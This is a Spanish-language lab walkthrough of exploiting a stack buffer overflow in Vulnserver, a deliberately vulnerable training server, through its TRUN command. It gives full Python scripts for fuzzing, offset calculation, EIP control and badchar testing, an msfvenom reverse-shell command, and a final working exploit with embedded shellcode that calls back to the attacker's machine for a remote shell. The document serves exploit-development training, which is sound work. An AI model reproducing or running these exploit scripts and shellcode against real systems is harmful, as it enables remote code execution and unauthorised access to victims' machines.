# Buffer overFlow: Vulnserver
- [Analizando el binario](#Analizando-el-binario)
- [Fuzzing](#Fuzzing)
- [Poc](#Poc)
- [Calculando el offset](#Calculando-el-offset)
- [Controlando el EIP](#Controlando-el-EIP)
- [Detectando badchars](#Detectando-badchars)
- [Salto al ESP](#Salto-al-ESP)
- [Generando shellcode](#Generando-shellcode)
- [Explotando el BOF](#Explotando-el-BOF)

- Link: https://github.com/stephenbradshaw/vulnserver

### Analizando el binario
- Al conectarme al `puerto 9999`, que es en el que se ejecuta el binario, el programa me indica que puedo utilizar diferentes comandos, en este caso vamos a explotar un BOF a través del comando `TRUN`. Para encontrar el punto para inyectar nuesto payload, podemos utilizar `generic_send_tcp`. Con este programa que esta en kali podemos enviar diferentes tipos de datos para ver si el programa crashea. Primero tenemos que crear un archivo con la estructura que queremos que envie: `spike.spk`
```bash
s_string("TRUN ");
s_string_variable("test");
```
- Con `immunity y mona` instalados en la máquina de pruebas, lanzo el programa y ejecuto el `immunity > File > Attach > Selecciono el programa > Attach > Pulso el Play` y `envio el generic_send_tcp`, para comprobar si el programa crashea:
```bash 
generic_send_tcp 192.168.248.134 9999 spike.spk 0 0
```
- Si miro el immunity pudo ver que el programa ha crasheado y me indica la estructura que tengo que utilizar para enviar mi payload. La estructura tiene que empezar con `TRUN /.:/`
- También puedo llegar a la misma conclusión siguiendo los mismos pasos que antes pero capturando el tráfico con `Wireshark` y analizando el tráfico con el filtro `tcp.port == 9999` que me permite ver los paquetes que se han pasado por `el puerto 9999`.
### Fuzzing
- Ahora creo un fuzzer para encontrar la longitud de la cadena que necesito, para que el programa se corrompa y poder explotar el BOF: `python fuzzing.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print("\n\n[!] Bye...\n")
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999
command = 'TRUN /.:/'
buffer = 'A'*100

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'Fuzzing with '  + str(len(buffer)) + ' bytes'
    s.send(command + buffer)
    s.recv(1024)
    s.close()
    time.sleep(2)
    buffer += 'A' * 100
  except:
    print '[*] Crash occurred at buffer length: ' + str(len(buffer))
    sys.exit()
```
### Poc
- Ahora de nuevo lanzo el programa y ejecuto el `immunity > File > Attach > Selecciono el programa > Attach > Pulso el Play` y envío el siguiente script, que es una poc para verificar que el programa crashea con el número de bytes que antes hemos indentificado: `python poc.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999

buffer = 'A'*2100
command = 'TRUN /.:/'
while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'POC with ' + str(len(buffer)) + ' bytes'
    s.send(command + buffer)
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
### Calculando el offset
- Aunque el fuzzer me ha indicado que el programa ha crasheado con 2000 bytes, en este caso como veremos más adelante el número de bytes para tomar el control del EIP es 2003. Como nuestro fuzzer va de 100 en 100 y como en este caso se añaden otros caracteres necesarios `/.:/`, lo ideal sería que el fuzzer nos hubiera indicado 2100, así que para calcular el offset creo una cadena de caracteres única de 2100 bytes. Para crear la cadena utilizo el siguiente comando en mi equipo:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```
- Incorporo la cadena de caracteres creada al script Calculate_offset.py y lo lanzo con el immunity abierto para ver cuanto vale el eip: `python Calculate_offset.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999
command = 'TRUN /.:/'
payload = ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9')

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'Send payload for calculate offset'
    s.send(command + payload)
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- En el caso de `vulnserver el EIP vale (386F4337)` y como está en `little endian`, tengo que darle la vuelta por pares, quedaría así `\x37\x43\x6F\x38` en hexadecimal y para ver cuano vale pongo: `echo "37436F38" | xxd -ps -r`, por si quiero buscarlo manualmente en la cadena enviada.
- Pero puedo hacerlo automáticamente con pattern_offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
```
- Con el comando anterior ya puedo saber cuanto vale el `offset`, que es 2003.

### Controlando el EIP
- Modifico el script para probar que puedo insertar en el `EIP` lo que yo quiera, por ejemplo "B", así que lo modifico para enviar, 2003 "A", 4 "B" y 100 "C": `python controlling_eip.py`
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999

command = 'TRUN /.:/'
offset = 'A'*2003
eip = 'BBBB'
after_eip = 'C'*100

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'Controlling eip'
    s.send(command + offset + eip + after_eip)
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Si todo ha ido bien veré que el EIP vale 42424242 y pulsado con el botón derecho sobre el ESP > Follow in Dump puedo ver en el recuadro de abajo a la izquierda lo que hay en la pila, que son las "C", es decir, muchos 43.
### Detectando badchars
- Como tengo que crear un `shellcode` pero los programas no admiten todos los caracteres, tengo que crear con `Mona un bytearray` que contenga todos los caracteres:
```bash
!mona config -set workingfolder C:\Users\tom\Desktop\%p # Primero me creo una carpeta de trabajo
!mona bytearray # Después me creo el bytearray, y con esto se me crea una carpeta en el escritorio que contine el bytearray
```
- Bytearray creado:
```bash
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
- Modifico el script anterior para añadir los badcharts y ver como antes, en `Follow in Dump` si alguno de los `batcharts no aparecen en el ESP`. El script modificado: `python badchars.py` 
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999

command = 'TRUN /.:/'
offset = 'A'*2003
eip = 'BBBB'
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'Send badchars'
    s.send(command + offset + eip + badchars)
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Para hacer esto, puedo buscar manualmente los batcharts que no aparecen o puedo hacerlo automaticamente. Primero crasheo el programa de nuevo y miro la primera dirección que aparece en el recuadro de abajo a la derecha `en el caso de vulnserver 0196F9E0` y después lo comparo con mona: 
```bash
!mona compare -f  C:\Users\tom\Desktop\vulnserver\bytearray.bin -a 0196F9E0
```
- En el caso de vulnserver, podemos usar todos los caracteres aunque por seguridad eliminaremos `\x00`.
### Salto al ESP
- Ahora que ya controlo el EIP tengo que buscar un `Opcode` para poder conducir el flujo del programa y saltar al ESP:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb #  Primero    
jmp ESP # Después pongo esto. Y el programa me da la dirección FFE4, es decir: \xFF\xE4
```
- Para ver donde puedo encontrar esa dirección pongo en el immunity: `!mona modules` y busco una dirección que esté todo en False, `para este ejemplo es essfunc.dll` y vuelvo a poner en el immunity: `!mona find -s "\xFF\xE4" -m essfunc.dll` y me quedo con la que ponga `PAGE_EXECUTE_READ`, y cojo la dirección que aparece a la izquierda: `0x625011af`
- Después, con esa dirección pulso en `"c"` en el menú de arriba y después en la flechita negra con la barra `"=>|"` en el menú, pongo la dirección y me confirma que `0x625011af` coresponde a un `JMP ESP`
- Ya sé que esta dirección 0x625011af me vale, y que `en little endian sería \xaf\x11\x50\x62`, así que modifico el anterior script para `añadir la dirección EIP`, para `añadir los nops: \x90` (dan tiempo para que el shellcode se decodifique) y para `añadir el shellcode que entrará en el ESP` y que se ejecutara justo después del `EIP`.
### Generando shellcode
- Genero el shellcode para entablarme una reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread
```
### Explotando el BOF
- El script final con todo añadido es: `python exploit_BOF.py`, así que me pongo en escucha y lanzo el script.
```bash
#!/usr/bin/python

import sys, socket, signal, time

def handler(sig, frame):
        print '\n\n[!] Bye...\n'
        sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, handler)

ipAddress = '192.168.248.134'
port = 9999

command = 'TRUN /.:/'
offset = 'A'*2003
eip = '\xaf\x11\x50\x62' # 0x625011af
nops = '\x90'*32

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread
shellcode = ("\xbd\x41\xdc\xc1\x7d\xdb\xd9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x6f\x12\x83\xef\xfc\x03\x2e\xd2\x23\x88\x4c\x02\x21"
"\x73\xac\xd3\x46\xfd\x49\xe2\x46\x99\x1a\x55\x77\xe9\x4e\x5a"
"\xfc\xbf\x7a\xe9\x70\x68\x8d\x5a\x3e\x4e\xa0\x5b\x13\xb2\xa3"
"\xdf\x6e\xe7\x03\xe1\xa0\xfa\x42\x26\xdc\xf7\x16\xff\xaa\xaa"
"\x86\x74\xe6\x76\x2d\xc6\xe6\xfe\xd2\x9f\x09\x2e\x45\xab\x53"
"\xf0\x64\x78\xe8\xb9\x7e\x9d\xd5\x70\xf5\x55\xa1\x82\xdf\xa7"
"\x4a\x28\x1e\x08\xb9\x30\x67\xaf\x22\x47\x91\xd3\xdf\x50\x66"
"\xa9\x3b\xd4\x7c\x09\xcf\x4e\x58\xab\x1c\x08\x2b\xa7\xe9\x5e"
"\x73\xa4\xec\xb3\x08\xd0\x65\x32\xde\x50\x3d\x11\xfa\x39\xe5"
"\x38\x5b\xe4\x48\x44\xbb\x47\x34\xe0\xb0\x6a\x21\x99\x9b\xe2"
"\x86\x90\x23\xf3\x80\xa3\x50\xc1\x0f\x18\xfe\x69\xc7\x86\xf9"
"\x8e\xf2\x7f\x95\x70\xfd\x7f\xbc\xb6\xa9\x2f\xd6\x1f\xd2\xbb"
"\x26\x9f\x07\x6b\x76\x0f\xf8\xcc\x26\xef\xa8\xa4\x2c\xe0\x97"
"\xd5\x4f\x2a\xb0\x7c\xaa\xbd\x7f\x28\x4c\xbe\xe8\x2b\xac\xc0"
"\x53\xa2\x4a\xa8\xb3\xe3\xc5\x45\x2d\xae\x9d\xf4\xb2\x64\xd8"
"\x37\x38\x8b\x1d\xf9\xc9\xe6\x0d\x6e\x3a\xbd\x6f\x39\x45\x6b"
"\x07\xa5\xd4\xf0\xd7\xa0\xc4\xae\x80\xe5\x3b\xa7\x44\x18\x65"
"\x11\x7a\xe1\xf3\x5a\x3e\x3e\xc0\x65\xbf\xb3\x7c\x42\xaf\x0d"
"\x7c\xce\x9b\xc1\x2b\x98\x75\xa4\x85\x6a\x2f\x7e\x79\x25\xa7"
"\x07\xb1\xf6\xb1\x07\x9c\x80\x5d\xb9\x49\xd5\x62\x76\x1e\xd1"
"\x1b\x6a\xbe\x1e\xf6\x2e\xde\xfc\xd2\x5a\x77\x59\xb7\xe6\x1a"
"\x5a\x62\x24\x23\xd9\x86\xd5\xd0\xc1\xe3\xd0\x9d\x45\x18\xa9"
"\x8e\x23\x1e\x1e\xae\x61")

while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ipAddress, port))
    s.recv(1024)
    print 'Send BOF exploit'
    s.send(command + offset + eip + nops + shellcode)
    s.recv(1024)
    s.close()
  except:
    print '[!] Crash occurred, exiting.'
    sys.exit()
```
- Una vez lanzado tendría que obtener una shell en la máquina objetivo.
